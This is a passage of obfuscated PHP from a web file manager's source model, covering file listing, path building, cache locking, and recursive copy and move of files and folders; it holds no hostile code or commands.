(!isset($CŲ[$e])) { $CŲ[$e] = array($a[203] => 0, $a[204] => 0); } $CŲ[$e][$D۴ٳ] += $c腉[$a[480]]; } foreach ($bٸ as &$e) { if (!$e[$a[403]]) { continue; } $BǍ = is_array($CŲ[$e[$a[395]]]) ? $CŲ[$e[$a[395]]] : $cւձ; $e[$a[204]] = $BǍ[$a[204]]; $e[$a[203]] = $BǍ[$a[203]]; unset($e[$a[405]]); } goto D摭; C: $a =& $_SERVER[̉]; $Fӎ = array(); $cւձ = array($a[203] => 0, $a[204] => 0); goto Cݸ; fʸ: $bҎ = array($a[478] => array($a[7], $Fӎ)); $Bߴ坴 = array($a[478], $a[403], $a[479] => $a[480]); $fƏŒ = $this->field($Bߴ坴)->where($bҎ)->group($a[481])->select(); goto dᢠ; bɼ䝗: } protected function _listAppendAuth(&$Bԏ) { goto cﲙ; eֳݞ: foreach ($Bԏ as $Bԉ) { if ($Bԉ[$e˹[404]] == self::TYPE_GROUP) { $d[] = $Bԉ[$e˹[395]]; } } if (!$d) { return; } $E쵽 = array_to_keyvalue($Bԏ, $e˹[395]); goto C; cﲙ: $e˹ =& $_SERVER[̉]; if (!defined($e˹[454])) { return; } $d = array(); goto eֳݞ; C: $c = Model($e˹[482])->getSourceList($d, $E쵽); foreach ($Bԏ as $d => &$Bԉ) { $Bԉ[$e˹[406]] = $c[$Bԉ[$e˹[395]]]; if (!$Bԉ[$e˹[406]] && $Bԉ[$e˹[404]] == self::TYPE_GROUP) { $Bԉ[$e˹[406]] = Action($e˹[483])->pathGroupAuthMake($Bԉ[$e˹[484]]); if (!$Bԉ[$e˹[406]] && !_get($GLOBALS, $e˹[485])) { $Bԉ[$e˹[196]] = !1; $Bԉ[$e˹[195]] = !1; } } if ($Bԉ[$e˹[406]]) { $Bԉ[$e˹[196]] = AuthModel::authCheckEdit($Bԉ[$e˹[406]][$e˹[407]]); $Bԉ[$e˹[195]] = AuthModel::authCheckView($Bԉ[$e˹[406]][$e˹[407]]); } $this->groupPathDisplay($Bԉ); } unset($Bԉ); goto f֐; f֐: } public function groupPathDisplay(&$bӏ) { goto E٧硻; cǡз: $bӏ[$f[492]] = $eۈ . $D[$f[85]][$f[395]]; goto Eܬ; E٧硻: $f =& $_SERVER[̉]; if ($bӏ[$f[404]] != self::TYPE_GROUP) { return; } $D = Model($f[486])->getInfo($bӏ[$f[484]]); goto F򢃾; a: $bӏ[$f[488]] = $D[$f[478]]; $bӏ[$f[489]] = $D[$f[487]]; $bӏ[$f[490]] = $D[$f[491]]; goto cǡз; F򢃾: $cΑ玊 = $this->parentLevelArray($D[$f[487]]); $eۈ = $f[33]; foreach ($cΑ玊 as $cث) { $b = Model($f[486])->getInfo($cث); $eۈ .= $b[$f[85]][$f[395]] . $f[47]; } goto a; Eܬ: } protected function _listAppendPath(&$Aۍ) { goto a; F͜ݎ: $dҫ = array(); foreach ($Aۍ as &$b) { $f = $b[$D֞늘[403]] == $D֞늘[87]; if ($f) { $fՠ[$b[$D֞늘[395]]] = $b[$D֞늘[28]]; } if (isset($dҫ[$b[$D֞늘[487]]])) { continue; } $dҫ[$b[$D֞늘[487]]] = !0; $fӟĽ = $this->parentLevelArray($b[$D֞늘[487]]); foreach ($fӟĽ as $C => $B陨) { if ($C != 0 && !isset($fՠ[$B陨])) { $E̷Ѥ[] = $B陨; } } } unset($b); goto Eחߥ; Eחߥ: $E̷Ѥ = array_unique($E̷Ѥ); if (count($E̷Ѥ) > 0) { $bǉ = array($D֞늘[410] => array($D֞늘[411], $E̷Ѥ)); if (count($E̷Ѥ) == 1) { $bۚ = $this->sourceInfo($E̷Ѥ[0]); $A߃ = is_array($bۚ) ? array($bۚ) : !1; } else { $A߃ = $this->field($D֞늘[493])->where($bǉ)->select(); } if (!$A߃) { $A߃ = array(); } foreach ($A߃ as $Cȷͨ) { $fՠ[$Cȷͨ[$D֞늘[395]]] = $Cȷͨ[$D֞늘[28]]; } } $B = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto A友; A友: $D༅ = array(); $c = array(); foreach ($Aۍ as &$b) { goto e᠆; B֍ղ: $b[$D֞늘[495]] = str_replace($D֞늘[496], $D֞늘[8], $F); $fછ = trim($b[$D֞늘[495]], $D֞늘[8]); if ($b[$D֞늘[478]] == $D֞늘[191] && $fછ) { $b[$D֞늘[28]] = $fછ; } goto EÝ; e᠆: $B֜ = $b[$D֞늘[487]]; if (isset($c[$B֜])) { $F = $D༅[$B֜]; } else { $fӟĽ = $this->parentLevelArray($b[$D֞늘[487]]); $a = $D֞늘[494] . $b[$D֞늘[404]] . $D֞늘[440] . $b[$D֞늘[484]]; if ($D༅[$a]) { $F = $D༅[$a]; } else { $F = $this->_listAppendPathRoot($b, $fӟĽ); $D༅[$a] = $F; } foreach ($fӟĽ as $C => $B陨) { if ($C == 0 && $F && $b[$D֞늘[404]] == self::TYPE_GROUP) { continue; } if (isset($fՠ[$B陨])) { $F .= $fՠ[$B陨] . $D֞늘[8]; } } if ($fӟĽ) { $F .= $b[$D֞늘[28]]; } $D༅[$B֜] = $F; } if ($b[$D֞늘[403]]) { $F .= $D֞늘[8]; } goto B֍ղ; EÝ: if (intval($b[$D֞늘[404]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($b, $fӟĽ, $B); } goto eȓ; eȓ: } goto aΉ; aΉ: unset($b); return $Aۍ; goto f슟; a: $D֞늘 =& $_SERVER[̉]; static $fՠ = array(); $E̷Ѥ = array(); goto F͜ݎ; f슟: } private function _listAppendPathRecycle(&$c, $D롢, $FЗ) { goto DߊŌ; cѝ: $bՠ = implode($dǊ[8], array_slice($Eד, 2)); $c[$dǊ[495]] = $dǊ[8] . LNG($dǊ[497]) . $dǊ[8] . ltrim($bՠ, $dǊ[8]); $c[$dǊ[487]] = $dǊ[498] . implode($dǊ[47], array_slice($D롢, 1)) . $dǊ[47]; goto Eꑃڥ; Eꑃڥ: if ($c[$dǊ[395]] == $FЗ) { $c[$dǊ[487]] = $dǊ[498]; $c[$dǊ[478]] = $dǊ[191]; $c[$dǊ[28]] = LNG($dǊ[497]); } $c[$dǊ[499]] = $dǊ[500]; goto Dَ; DߊŌ: $dǊ =& $_SERVER[̉]; if (!in_array($FЗ, $D롢) && $c[$dǊ[395]] != $FЗ) { return; } $Eד = explode($dǊ[8], trim($c[$dǊ[495]], $dǊ[8])); goto cѝ; Dَ: } protected function _listAppendPathRoot(&$A۸, $DƦ) { $f =& $_SERVER[̉]; $E޲ = $f[33]; if ($A۸[$f[404]] == self::TYPE_USER) { if (defined($f[454]) && $A۸[$f[484]] == USER_ID) { $E޲ = LNG($f[501]); if (!$DƦ) { $A۸[$f[28]] = $E޲; } } else { $Eԥ޶ = Model($f[502])->getInfoSimple($A۸[$f[484]]); $E޲ = LNG($f[503]) . $f[160] . $Eԥ޶[$f[28]] . $f[504]; } } else { if ($A۸[$f[404]] == self::TYPE_GROUP) { $Eԥ޶ = Model($f[486])->getInfoSimple($A۸[$f[484]]); $E޲ = $Eԥ޶[$f[28]]; } else { if ($A۸[$f[404]] == self::TYPE_SYSTEM) { $E޲ = $f[505]; } } } $E޲ = $E޲ ? $f[8] . $E޲ . $f[8] : $f[8]; return $E޲; } protected function _listAppendUser(&$F) { goto eࠋ; E: $Eؾ = array_merge($Aީ, $EﳱŪ); $dⷧƄ = Model($fњ[506])->userListInfo($Eؾ); foreach ($F as &$D) { $F = $D[$fњ[432]]; $D[$fњ[432]] = $dⷧƄ[$F] ? $dⷧƄ[$F] : !1; $F = $D[$fњ[434]]; $D[$fњ[434]] = $dⷧƄ[$F] ? $dⷧƄ[$F] : !1; if (isset($D[$fњ[445]]) && $D[$fњ[445]][$fњ[507]]) { $aƉح = $GLOBALS[$fњ[6]][$fњ[88]][$fњ[508]]; if ($D[$fњ[445]][$fњ[509]] <= time() - $aƉح) { $this->metaSet($D[$fњ[395]], $fњ[507], null); $this->metaSet($D[$fњ[395]], $fњ[509], null); unset($D[$fњ[445]][$fњ[507]]); continue; } $F塲 = $D[$fњ[445]][$fњ[507]]; $D[$fњ[445]][$fњ[510]] = Model($fњ[506])->getInfoSimpleOuter($F塲); } } goto DƐ; DƐ: unset($D); goto b; eࠋ: $fњ =& $_SERVER[̉]; $Aީ = array_to_keyvalue($F, $fњ[33], $fњ[432]); $EﳱŪ = array_to_keyvalue($F, $fњ[33], $fњ[434]); goto E; b: } public function parentLevelArray($Aݯ) { $Aͭ =& $_SERVER[̉]; $Aݯ = explode($Aͭ[47], trim($Aݯ, $Aͭ[47])); return array_remove_value($Aݯ, $Aͭ[191]); } public function listAll($e䧇׷) { goto e; dɐ: $d딡 = array(); foreach ($CǑ as $D¡ => $EĂ) { goto a; e۳߼: if (!$EĂ[$D¸⃙[403]]) { $cՆۨ[$D¸⃙[447]] = $EĂ[$D¸⃙[447]]; $cՆۨ[$D¸⃙[86]] = $EĂ[$D¸⃙[76]]; } $d딡[] = $cՆۨ; goto A݉; f󹘫: for ($b = 0; $b < count($f߳); $b++) { $CʘҬ .= $CǑ[$f߳[$b]][$D¸⃙[28]] . $D¸⃙[8]; } $CʘҬ .= $EĂ[$D¸⃙[28]]; if ($EĂ[$D¸⃙[403]]) { $CʘҬ .= $D¸⃙[8]; } goto D۳; a: $f߳ = $this->parentLevelArray($EĂ[$D¸⃙[487]]); array_shift($f߳); $CʘҬ = $a; goto f󹘫; D۳: $CʘҬ = str_replace($D¸⃙[496], $D¸⃙[8], $CʘҬ); $CʘҬ = str_replace($D¸⃙[496], $D¸⃙[8], $CʘҬ); $cՆۨ = array($D¸⃙[414] => str_replace($D¸⃙[496], $D¸⃙[8], $CʘҬ), $D¸⃙[517] => intval($EĂ[$D¸⃙[403]]), $D¸⃙[85] => $this->pathInfoFilter($EĂ)); goto e۳߼; A݉: } return $d딡; goto Fĕ݅; C谰Ē: $this->_listAppendAuth($CǑ); $this->_listAppendUser($CǑ); $this->_listAppendPath($CǑ); goto C̦; E: $Aؒߑ = $D¸⃙[515]; $A = "\x4c\105\x46\124\40\112\x4f\111\x4e\x20{$this->tablePrefix}\151\x6f\x5f\146\x69\x6c\145\x20\146\151\154\145\x20\x6f\156\40\x73\157\x75\x72\143\x65\56\146\151\154\x65\x49\x44\x20\75\x20\x66\151\x6c\145\56\146\151\x6c\145\x49\104"; $CǑ = $this->alias($D¸⃙[516])->field($Aؒߑ)->where($Fӂ)->join($A)->select(); goto C谰Ē; C̦: $CǑ = array_to_keyvalue($CǑ, $D¸⃙[395]); $a = "\x2f{$Dع[$D¸⃙[28]]}\x2f"; $a = $a == $D¸⃙[496] ? $D¸⃙[8] : $a; goto dɐ; e: $D¸⃙ =& $_SERVER[̉]; $Dع = $this->sourceInfo($e䧇׷); $Fӂ = array($D¸⃙[511] => array($D¸⃙[512], $Dع[$D¸⃙[487]] . $e䧇׷ . $D¸⃙[513]), $D¸⃙[514] => 0); goto E; Fĕ݅: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($dŏ懗) { goto eʣ; C: $Fη􇿿 = 1; $this->_lockEvent($dŏ懗, array($e[519], $e[520]), $Fη􇿿); $this->_lockParent($dŏ懗, array($e[520]), $Fη􇿿); goto d; d: $this->_lockEvent($dŏ懗, array($e[521], $e[522]), $Fη􇿿); $this->_lockCheckEnd($e[518], $dŏ懗); goto cŘ; eʣ: $e =& $_SERVER[̉]; if (!$this->allowLock()) { return; } $this->_lockCheck($e[518], $dŏ懗); goto C; cŘ: } public function lockCopyEnd($b) { $BŐ =& $_SERVER[̉]; if (!$this->allowLock()) { return; } $b = 0; $this->_lockEvent($b, array($BŐ[519], $BŐ[520]), $b); $this->_lockParent($b, array($BŐ[520]), $b); $this->_lockEvent($b, array($BŐ[521], $BŐ[522]), $b); } public function lockWriteStart($Fު, $DܺĹĎ = '') { goto A; A: $a =& $_SERVER[̉]; if (!$this->allowLock()) { return; } $this->_lockCheck($a[519], $Fު); goto aʴ; b݂: $this->_lockParent($Fު, array($a[518], $a[520]), $a); $this->_lockCheckEnd($a[519], $Fު); goto C; aʴ: $a = 1; $this->_lockKey($a[523] . $Fު . $a[95] . $DܺĹĎ, $a); $this->_lockEvent($Fު, array($a[518], $a[520]), $a); goto b݂; C: } public function lockWriteEnd($D鍘, $e夶 = '') { $EŠ =& $_SERVER[̉]; if (!$this->allowLock()) { return; } $a = 0; $this->_lockKey($EŠ[523] . $D鍘 . $EŠ[95] . $e夶, $a); $this->_lockEvent($D鍘, array($EŠ[518], $EŠ[520]), $a); $this->_lockParent($D鍘, array($EŠ[518], $EŠ[520]), $a); } public function lockMoveStart($aَ) { goto eږ; DԤ: $this->_lockParent($aَ, array($b򏃺[518], $b򏃺[520]), $Dǎ); $this->_lockEvent($aَ, array($b򏃺[525], $b򏃺[521], $b򏃺[522]), $Dǎ); $this->_lockCheckEnd($b򏃺[520], $aَ); goto Bգ; C͟߶: $Dǎ = 1; $this->_lockKey($b򏃺[524] . $aَ, $Dǎ); $this->_lockEvent($aَ, array($b򏃺[518], $b򏃺[519]), $Dǎ); goto DԤ; eږ: $b򏃺 =& $_SERVER[̉]; if (!$this->allowLock()) { return; } $this->_lockCheck($b򏃺[520], $aَ); goto C͟߶; Bգ: } public function lockMoveEnd($c) { goto eڛ; cȬ: $this->_lockKey($Cͺẑ[524] . $c, $a); $this->_lockEvent($c, array($Cͺẑ[518], $Cͺẑ[519]), $a); $this->_lockParent($c, array($Cͺẑ[518], $Cͺẑ[520]), $a); goto EΛ; EΛ: $this->_lockEvent($c, array($Cͺẑ[525], $Cͺẑ[521], $Cͺẑ[522]), $a); goto dᑐ; eڛ: $Cͺẑ =& $_SERVER[̉]; if (!$this->allowLock()) { return; } $a = 0; goto cȬ; dᑐ: } private function _lockCheck($C桮, $F) { goto F; c: $this->_lockTimeStart[$C] = timeFloat(); if (!is_array($E썲)) { return; } $Cμ = LNG($FŐ[526]); goto Eݧı; Eݧı: CacheLock::setErrorMsg($FŐ[160] . htmlspecialchars($E썲[$FŐ[28]]) . $FŐ[504] . $Cμ); $this->_lockKey($C, 1); $this->_lockKey($C, 0); goto f߶; F: $FŐ =& $_SERVER[̉]; $E썲 = $this->sourceInfo($F); $C = $C桮 . $FŐ[95] . $F; goto c; f߶: $B̓鷲 = array_reverse($this->parentLevelArray($E썲[$FŐ[487]])); foreach ($B̓鷲 as $A) { $C = $C桮 . $FŐ[527] . $A; if (CacheLock::lockGet($FŐ[528] . $C)) { $E썲 = $this->sourceInfo($A); CacheLock::setErrorMsg($FŐ[160] . htmlspecialchars($E썲[$FŐ[28]]) . $FŐ[504] . $Cμ); $this->_lockKey($C, 1); $this->_lockKey($C, 0); } } goto f; f: } private function _lockCheckEnd($A, $c܅) { goto B; B: $f쵞 =& $_SERVER[̉]; $C斖 = $A . $f쵞[95] . $c܅; CacheLock::setErrorMsg($f쵞[375]); goto bŞ; D: if ($Bᗿ > 0.5) { unset(self::$cacheSourceInfo[$f쵞[438] . $c܅]); } $a޻Ǫ܆ = $this->sourceInfo($c܅); if (!$a޻Ǫ܆) { show_json(LNG($f쵞[105]), !1); } goto Aɸ; bŞ: if (!isset($this->_lockTimeStart[$C斖])) { return; } $Bᗿ = timeFloat() - $this->_lockTimeStart[$C斖]; unset($this->_lockTimeStart[$C斖]); goto D; Aɸ: } private function _lockParent($eʔ, $D±󅓙, $D) { if (!$this->autoLockSet) { return; } $a̬ = $this->sourceInfo($eʔ); if (!is_array($a̬)) { return; } $Dݯƶ = array_reverse($this->parentLevelArray($a̬[$_SERVER[̉][487]])); foreach ($Dݯƶ as $C) { $this->_lockEvent($C, $D±󅓙, $D); } } private function _lockEvent($EÐ, $Eի, $d) { $b߳ =& $_SERVER[̉]; if (!$this->autoLockSet) { return; } foreach ($Eի as $Bٯ͍) { $aɌ = $Bٯ͍ . $b߳[95] . $EÐ; if ($d && CacheLock::lockGet($b߳[528] . $aɌ)) { continue; } $this->_lockKey($aɌ, $d); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($DɌ, $FÃ = 1) { $a۬ǋ = $_SERVER[̉][528] . md5($DɌ); if ($FÃ) { if (isset(self::$_lockItemArr[$a۬ǋ])) { return; } self::$_lockItemArr[$a۬ǋ] = 1; CacheLock::lock($a۬ǋ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$a۬ǋ])) { return; } unset(self::$_lockItemArr[$a۬ǋ]); CacheLock::unlock($a۬ǋ); } } public function isParentOf($Cүĩ, $Fϩ) { goto A񐜭; A񐜭: $A =& $_SERVER[̉]; $e˜ = $this->sourceInfo($Cүĩ); $a􃴎葠 = $this->sourceInfo($Fϩ); goto B푅Յ; B푅Յ: $d = $e˜[$A[487]] . $e˜[$A[395]] . $A[47]; $Eߌ = $a􃴎葠[$A[487]] . $a􃴎葠[$A[395]] . $A[47]; $aɫР = strpos($Eߌ, $d) === 0; goto bє; bє: return $aɫР; goto e; e: } private $targetIsDelete = 0; public function copy($B넪, $CǨ, $D = REPEAT_REPLACE, $Eڋ = '') { goto f䱸ϟ; f䱸ϟ: $f =& $_SERVER[̉]; $a = $this->sourceInfo($B넪); $bٳ = $this->sourceInfo($CǨ); goto bʻ; FȞ: $this->lockCopyStart($B넪); $this->lockWriteStart($CǨ, $C䮏); $BɴǊŐ = array($f[529] => array(), $f[530] => array(), $f[531] => array()); goto fɎԢ; f˛: $this->updateModifyTime($CǨ); return $d; goto B̒ǅ; AƗ: if ($a[$f[403]] == $f[87] && $C֑ == $d) { $this->folderSizeResetChildren($C֑); } Model($f[532])->addAll($BɴǊŐ[$f[530]], array(), !0); if ($C֑ != $d || $a[$f[403]] == $f[87]) { Model($f[533])->eventCopy($d); } goto e͹; bʻ: if (!$a || !$bٳ || $bٳ[$f[403]] != $f[87]) { return !1; } if ($this->isParentOf($B넪, $CǨ)) { return !1; } $C䮏 = $Eڋ ? $Eڋ : $a[$f[28]]; goto FȞ; fɎԢ: $this->targetIsDelete = intval($a[$f[423]]); $C֑ = $this->fileNameExistCache($CǨ, $a[$f[28]]); $d = $this->_copy($B넪, $CǨ, $D, $BɴǊŐ, !0, $Eڋ); goto Dᚖ뚅; Dᚖ뚅: $this->_childrenListClear(); $this->lockCopyEnd($B넪); $this->lockWriteEnd($CǨ, $C䮏); goto AƗ; e͹: $this->saveAll($BɴǊŐ[$f[531]]); Model($f[193])->linkAdd($BɴǊŐ[$f[529]]); $this->folderSizeReset($CǨ); goto f˛; B̒ǅ: } private function _copy($EӘ, $Bڹꑆ, $B, &$F谆, $A앹, $fϺ = '') { goto dҬ; b: $aҝ¹ = $fϺ ? $fϺ : $e݋ߛ[$Fë[28]]; $C듕ޢ = $this->fileNameExistCache($Bڹꑆ, $aҝ¹); if ($A앹) { $this->_childrenAllMake($EӘ); if ($Bُ && $C듕ޢ) { $this->_childrenAllMake($C듕ޢ); } } goto bѣ; dҬ: $Fë =& $_SERVER[̉]; $e݋ߛ = $this->sourceInfoCache($EӘ); $Bُ = $e݋ߛ[$Fë[403]] == $Fë[87]; goto b; a: return $c; goto E; bѣ: if (!$C듕ޢ) { return $this->_copyCreate($EӘ, $Bڹꑆ, $aҝ¹, $F谆); } $c = $C듕ޢ; if ($Bُ) { if ($B == REPEAT_RENAME_FOLDER) { $aҝ¹ = $this->fileNameAutoCache($Bڹꑆ, $aҝ¹, $B, $Bُ); $c = $this->_copyCreate($EӘ, $Bڹꑆ, $aҝ¹, $F谆); } else { $dۮԐ = $this->_childrenList($EӘ); foreach ($dۮԐ as $aۇ) { $this->_copy($aۇ[$Fë[395]], $C듕ޢ, $B, $F谆, !1); } } } else { if ($B == REPEAT_RENAME || $B == REPEAT_RENAME_FOLDER) { $aҝ¹ = $this->fileNameAutoCache($Bڹꑆ, $aҝ¹, $B, $Bُ); $c = $this->_copyCreate($EӘ, $Bڹꑆ, $aҝ¹, $F谆); } else { if ($B == REPEAT_REPLACE) { $aύ = $this->sourceInfoCache($C듕ޢ); $b㩹躲 = $this->fileHistory($aύ, $e݋ߛ[$Fë[447]], $e݋ߛ[$Fë[78]]); if ($b㩹躲) { $F谆[$Fë[529]][] = $e݋ߛ[$Fë[447]]; } } else { if ($B == REPEAT_SKIP) { } } } Hook::trigger($Fë[534], array($Fë[535], $e݋ߛ, 0)); } goto a; E: } private function _copyCreate($eѕю, $E˵, $BȢ, &$b) { goto fݷ; B: foreach ($Aɓ as $d߱) { $aãɟ = $d߱[$a[395]]; $d = $this->_childrenMatch($BČ, $d߱, $Bŭ); $E׍[] = array($a[395], $aãɟ, $a[478], $d[$a[478]]); $D[] = array($a[395], $aãɟ, $a[487], $d[$a[487]]); $this->_copyApplyMeta($d߱, $b); if ($d߱[$a[403]] != $a[87]) { $b[$a[529]][] = $d߱[$a[447]]; } } $this->chunkEventSet($a[541], array($a[542], $EƄŜ, $Aċ)); $this->saveAll($E׍); goto F; a: $EƄŜ = $this->_makeItemData($FҞ͝, $b鸜, $BȢ); Hook::trigger($a[536], $EƄŜ); Hook::trigger($a[537], array($a[538], $EƄŜ, 0)); goto f; F: $Bŭ = $this->sourceInfo($A͋); foreach ($Fٓ as $d߱) { $CƑ = $this->_makeItemData($d߱, $Bŭ, $d߱[$a[28]]); $CƑ[$a[487]] = $d߱[$a[487]]; $f[] = $CƑ; } $this->chunkEventSet($a[539], array($a[540], $EƄŜ, $Aċ)); goto aڃ; F: $this->chunkEventSet($a[543], array($a[544], $EƄŜ, $Aċ)); $this->saveAll($D); return $A͋; goto Eǵ; fݷ: $a =& $_SERVER[̉]; $FҞ͝ = $this->sourceInfoCache($eѕю); $b鸜 = $this->sourceInfoCache($E˵); goto a; Cɸ͌: $BČ[$eѕю] = $A͋; $E׍ = array(); $D = array(); goto B; f: $A͋ = $this->add($EƄŜ); $Båˍ = array($a[395] => $A͋, $a[28] => $BȢ); $this->_copyApplyMeta($Båˍ, $b); goto Cջ̟; E߅Ƭ: $this->_childrenListAll($eѕю, $Fٓ); $Aċ = count($Fٓ); if ($Aċ == 0) { return $A͋; } goto F; aڃ: $this->addAll($f, array(), !1); $Aɓ = $this->where(array($a[478] => $A͋))->select(); $BČ = $this->_childrenMakeRelation($Fٓ, $Aɓ); goto Cɸ͌; Cջ̟: if ($FҞ͝[$a[403]] != $a[87]) { $b[$a[529]][] = $FҞ͝[$a[447]]; return $A͋; } $Fٓ = array(); $f = array(); goto E߅Ƭ; Eǵ: } private function _childrenMakeRelation($Fב, $D) { $Dʌʎ =& $_SERVER[̉]; $dǱ莍 = array(); $Aޒɬ = array(); foreach ($Fב as $bβ) { $B뜈ɜ = $bβ[$Dʌʎ[28]] . $Dʌʎ[8] . $bβ[$Dʌʎ[487]]; $dǱ莍[$B뜈ɜ] = $bβ[$Dʌʎ[395]]; } foreach ($D as $bβ) { $B뜈ɜ = $bβ[$Dʌʎ[28]] . $Dʌʎ[8] . $bβ[$Dʌʎ[487]]; $fϰ = $dǱ莍[$B뜈ɜ]; $Aޒɬ[$fϰ] = $bβ[$Dʌʎ[395]]; } return $Aޒɬ; } private function _childrenMatch($Ẻ̦, $eކ, $fõ) { goto a; b: foreach ($DԂɋ as $Cژж) { if (isset($Ẻ̦[$Cژж])) { $fРܑ .= $Ẻ̦[$Cژж] . $Eń[545]; } } $fРܑ = rtrim($fРܑ, $Eń[47]) . $Eń[47]; $bѥ = $this->parentLevelArray($fРܑ); goto A; A: $E = $bѥ[count($bѥ) - 1]; return array($Eń[478] => $E, $Eń[487] => $fРܑ); goto eޚ; a: $Eń =& $_SERVER[̉]; $fРܑ = $fõ[$Eń[487]]; $DԂɋ = $this->parentLevelArray($eކ[$Eń[487]]); goto b; eޚ: } private function _makeItemData($C, $f, $bⓄ) { $CɦȔ =& $_SERVER[̉]; $cʍȸ = array($CɦȔ[546] => $C[$CɦȔ[403]], $CɦȔ[413] => $bⓄ, $CɦȔ[547] => $C[$CɦȔ[405]], $CɦȔ[448] => $C[$CɦȔ[447]], $CɦȔ[548] => $C[$CɦȔ[78]], $CɦȔ[549] => $f[$CɦȔ[404]], $CɦȔ[550] => $f[$CɦȔ[484]], $CɦȔ[551] => USER_ID, $CɦȔ[552] => USER_ID, $CɦȔ[394] => $f[$CɦȔ[395]], $CɦȔ[553] => $f[$CɦȔ[487]] . $f[$CɦȔ[395]] . $CɦȔ[47], $CɦȔ[417] => $C[$CɦȔ[84]], $CɦȔ[422] => 0, $CɦȔ[554] => $CɦȔ[33]); return $cʍȸ; } private function _copyApplyMeta($A؃, &$b퇺) { $a۲ =& $_SERVER[̉]; $c螂 = $A؃[$a۲[395]]; $E = $A؃[$a۲[28]]; if (!isset($A؃[$a۲[555]]) || !$A؃[$a۲[555]] || $A؃[$a۲[555]] == $a۲[191]) { $b퇺[$a۲[531]][] = array($a۲[395], $c螂, $a۲[555], short_id($c螂)); } if (Input::check($E, $a۲[556])) { $b퇺[$a۲[530]][] = array($a۲[395] => $c螂, $a۲[93] => $a۲[444], $a۲[372] => str_replace($a۲[50], $a۲[33], Pinyin::encode($E))); $b퇺[$a۲[530]][] = array($a۲[395] => $c螂, $a۲[93] => $a۲[443], $a۲[372] => Pinyin::encode($E, $a۲[557])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($eҞ) { goto b₈; Fǖ: $Aуۊ = array_to_keyvalue($Aуۊ, $c玥[395]); foreach ($Aуۊ as $Dς) { $e̳ = $Dς[$c玥[478]]; $eҞ = $Dς[$c玥[395]]; if (!isset($this->_childrenListCache[$eҞ]) && $Dς[$c玥[403]] == $c玥[87]) { $this->_childrenListCache[$eҞ] = array(); } if (!isset($this->_childrenListCache[$e̳])) { $this->_childrenListCache[$e̳] = array(); } $this->_childrenListCache[$e̳][$eҞ] = $Dς; $this->_childrenItemCache[$eҞ] = $Dς; } goto c炸; b₈: $c玥 =& $_SERVER[̉]; $a = $this->sourceInfo($eҞ); $Aڬж = $c玥[424]; goto d; d: $dՅ⌝ = array($c玥[487] => array($c玥[512], $a[$c玥[487]] . $eҞ . $c玥[513]), $c玥[423] => $this->targetIsDelete); $Aуۊ = $this->field($Aڬж)->where($dՅ⌝)->select(); if (!$Aуۊ) { return; } goto Fǖ; c炸: } private function _childrenListAll($C՛, &$c۵) { $cӐ =& $_SERVER[̉]; if (!isset($this->_childrenListCache[$C՛])) { return; } $F쎪 = $this->_childrenListCache[$C՛]; foreach ($F쎪 as $EԾ => $A) { $c۵[$EԾ] = $A; if ($A[$cӐ[403]] == $cӐ[87]) { $this->_childrenListAll($EԾ, $c۵); } } } private function sourceInfoCache($D) { if (isset($this->_childrenItemCache[$D])) { return $this->_childrenItemCache[$D]; } return $this->sourceInfo($D); } private function _childrenList($eڭ޺) { if (isset($this->_childrenListCache[$eڭ޺])) { return $this->_childrenListCache[$eڭ޺]; } return $this->_childrenListSelect($eڭ޺); } private function _childrenListSelect($Aƒ) { goto bх՗; bх՗: $fങ =& $_SERVER[̉]; $Dȕ = array($fങ[478] => $Aƒ, $fങ[423] => $this->targetIsDelete); $E = $this->where($Dȕ)->select(); goto A˲; A˲: $E = $E ? $E : array(); $A姌 = array_to_keyvalue($E, $fങ[395]); $this->_childrenListCache[$Aƒ] = $A姌; goto A; A: foreach ($A姌 as $Aƒ => $F߅) { $this->_childrenItemCache[$Aƒ] = $F߅; } return $A姌; goto B쭮; B쭮: } private function fileNameExistCache($F, $dĘ) { $e΍ =& $_SERVER[̉]; $dĘ = strtolower($dĘ); $D䟎Φ = $this->_childrenList($F); foreach ($D䟎Φ as $f奍ê) { if ($dĘ == strtolower($f奍ê[$e΍[28]])) { return $f奍ê[$e΍[395]]; } } return !1; } private function fileNameAutoCache($E䬸Ō, $CĲ, $e׍, $cۍ܌) { $b =& $_SERVER[̉]; $d🛆 = $this->_childrenList($E䬸Ō); $AǇ = array_to_keyvalue($d🛆, $b[33], $b[28]); return $this->fileNameAutoGet($AǇ, $CĲ, $e׍, $cۍ܌); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($f, $B, $C괳 = REPEAT_REPLACE, $e˹ = '') { goto cƇ; D؉ғ: if ($d[$cӄ砷[403]] == $cӄ砷[87] && $d) { $this->folderSizeResetChildren($f딤); } Model($cӄ砷[193])->linkAdd($dź[$cӄ砷[529]]); if ($d && $dź[$cӄ砷[560]]) { $this->removeNow($f, !1); } goto Bу; a: $this->updateModifyTime($Dߑ); Model($cӄ砷[533])->eventMove($f, $d[$cӄ砷[478]], $B); Hook::trigger($cӄ砷[559], $e); goto cݚ; cݚ: return $f딤; goto B㎸; B: $this->lockWriteStart($B, $c߸); $dź = array($cӄ砷[529] => array(), $cӄ砷[560] => !1); $this->clearShare($f, $B); goto bޟ; bޟ: $d = $this->fileNameExistCache($B, $d[$cӄ砷[28]]); $f딤 = $this->_move($f, $B, $C괳, $dź, $e˹); $this->sourceCacheClear(); goto D؉ғ; Eŧ: if ($d[$cӄ砷[478]] == $B && $e˹ != $d[$cӄ砷[28]]) { $fؓ = $this->fileNameExist($B, $e˹); if ($fؓ && $d[$cӄ砷[403]] == $cӄ砷[191]) { goto dƱƩ; A𬼫: $this->removeNow($f, !1); $this->folderSizeReset($B); Hook::trigger($cӄ砷[559], $e); goto Dۮ; Dۮ: return $fؓ; goto b͠; dƱƩ: $e = $this->sourceInfo($fؓ); $A᫅ = $this->fileHistory($e, $d[$cӄ砷[447]], $d[$cӄ砷[78]]); if (!$A᫅) { Model($cӄ砷[450])->remove($d[$cӄ砷[447]]); } goto A𬼫; b͠: } } $c߸ = $e˹ ? $e˹ : $d[$cӄ砷[28]]; $this->lockMoveStart($f); goto B; cƇ: 